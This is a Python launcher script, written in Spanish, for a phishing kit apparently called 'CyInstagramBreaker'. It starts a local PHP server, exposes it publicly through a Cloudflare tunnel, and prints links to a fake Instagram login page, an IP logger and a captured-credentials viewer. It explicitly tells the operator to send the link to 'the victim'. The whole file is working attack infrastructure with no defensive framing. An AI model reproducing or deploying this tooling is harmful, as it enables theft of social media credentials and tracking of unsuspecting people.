#!/usr/bin/env python3
"""
CyInstagramBreaker - Server Auto Launcher
Levanta PHP server y Cloudflare Tunnel automáticamente
"""

import subprocess
import threading
import time
import os
import sys
import socket
import re

def clear_screen():
    """Limpia la pantalla"""
    os.system('clear' if os.name == 'posix' else 'cls')

def get_local_ip():
    """Obtiene la IP local"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def start_php_server(port=8080):
    """Inicia servidor PHP en segundo plano"""
    print("[*] Iniciando servidor PHP...")
    
    # Verificar si PHP está instalado
    try:
        subprocess.run(["php", "-v"], capture_output=True, check=True)
    except:
        print("[!] PHP no encontrado. Instala con: sudo apt install php")
        return None
    
    # Iniciar PHP server
    php_cmd = ["php", "-S", f"0.0.0.0:{port}"]
    
    try:
        php_proc = subprocess.Popen(
            php_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(2)
        return php_proc
    except Exception as e:
        print(f"[!] Error al iniciar PHP: {e}")
        return None

def extract_tunnel_url(output):
    """Extrae URL del túnel de Cloudflare"""
    patterns = [
        r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com',
        r'https://[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-]+\.trycloudflare\.com'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, output)
        if match:
            return match.group(0)
    return None

def start_cloudflared_tunnel(port=8080):
    """Inicia túnel Cloudflare y captura la URL"""
    print("[*] Iniciando túnel Cloudflare...")
    
    # Verificar si cloudflared existe y es ejecutable
    if not os.path.exists("cloudflared"):
        print("[!] cloudflared no encontrado en el directorio actual")
        return None, None
    
    os.chmod("cloudflared", 0o755)
    
    # Comando para cloudflared
    cf_cmd = ["./cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
    
    try:
        # Crear pipe para capturar salida en tiempo real
        cf_proc = subprocess.Popen(
            cf_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        tunnel_url = None
        print("[*] Esperando URL del túnel...")
        
        # Leer salida en tiempo real por 20 segundos máximo
        start_time = time.time()
        while time.time() - start_time < 20 and tunnel_url is None:
            line = cf_proc.stderr.readline()
            if not line:
                time.sleep(0.1)
                continue
            
            # Buscar URL del túnel
            url = extract_tunnel_url(line)
            if url:
                tunnel_url = url
                print("[✓] ¡Túnel encontrado!")
                break
        
        if tunnel_url:
            return cf_proc, tunnel_url
        else:
            cf_proc.terminate()
            return None, None
            
    except Exception as e:
        print(f"[!] Error con cloudflared: {e}")
        return None, None

def display_final_summary(port, local_ip, tunnel_url):
    """Muestra el resumen final limpio"""
    clear_screen()
    
    from datetime import datetime
    current_time = datetime.now().strftime('%H:%M:%S')
    current_date = datetime.now().strftime('%Y-%m-%d')
    
    summary = f"""
{'='*70}
🎯 RESUMEN DE CONEXIONES - {current_time}
{'='*70}

📡 CONEXIONES LOCALES:
   🔗 http://localhost:{port}
   🔗 http://127.0.0.1:{port}
   🌐 http://{local_ip}:{port}

🌍 TÚNEL PÚBLICO CLOUDFLARE:
   🔗 {tunnel_url if tunnel_url else 'No disponible'}

📊 PANELES DE CONTROL:
   👤 Login Page:    http://localhost:{port}/login.html
   📊 Visor:         http://localhost:{port}/visor.php
   📍 IP Logger:     http://localhost:{port}/ip.php

{'='*70}
💡 INFORMACIÓN:
   • Puerto local: {port}
   • IP local: {local_ip}
   • Hora inicio: {current_date} {current_time}
   • Usa CTRL+C para detener todo
{'='*70}
"""
    print(summary)

def main():
    """Función principal"""
    
    # Configuración
    PORT = 8080
    
    print("🚀 CyInstagramBraker - Iniciando servicios...\n")
    
    # 1. Iniciar servidor PHP
    php_proc = start_php_server(PORT)
    if not php_proc:
        print("[!] No se pudo iniciar el servidor PHP")
        return
    
    time.sleep(1)
    
    # 2. Obtener IP local
    local_ip = get_local_ip()
    
    # 3. Iniciar túnel Cloudflare
    cf_proc, tunnel_url = start_cloudflared_tunnel(PORT)
    
    # 4. Mostrar resumen final
    display_final_summary(PORT, local_ip, tunnel_url)
    
    # 5. Mostrar instrucciones para el usuario
    print("\n🔥 ENVÍA ESTOS ENLACES A LA VÍCTIMA:")
    if tunnel_url:
        print(f"   📲 {tunnel_url}/login.html")
    else:
        print(f"   📲 http://{local_ip}:{PORT}/login.html")
    
    print("\n📊 Para ver registros en tiempo real, visita en tu navegador:")
    print(f"   👁️  http://localhost:{PORT}/visor.php")
    
    print("\n🛑 Presiona CTRL+C para detener todos los servicios...")
    
    try:
        # Mantener el script corriendo
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\n[*] Deteniendo servicios...")
        
        # Terminar procesos
        if php_proc:
            php_proc.terminate()
            print("[✓] PHP Server detenido")
        
        if cf_proc:
            cf_proc.terminate()
            print("[✓] Cloudflare Tunnel detenido")
        
        print("[✓] ¡Todos los servicios han sido detenidos!\n")

if __name__ == "__main__":
    try:
        # Verificar que estamos en Linux
        if os.name != 'posix':
            print("[!] Este script está diseñado solo para Linux")
            sys.exit(1)
            
        # Verificar archivos necesarios
        required_files = ['login.html', 'login.php', 'ip.php', 'visor.php', 'cloudflared']
        for file in required_files:
            if not os.path.exists(file):
                print(f"[!] Archivo necesario no encontrado: {file}")
                sys.exit(1)
        
        main()
        
    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por el usuario")
    except Exception as e:
        print(f"\n[!] Error inesperado: {e}")
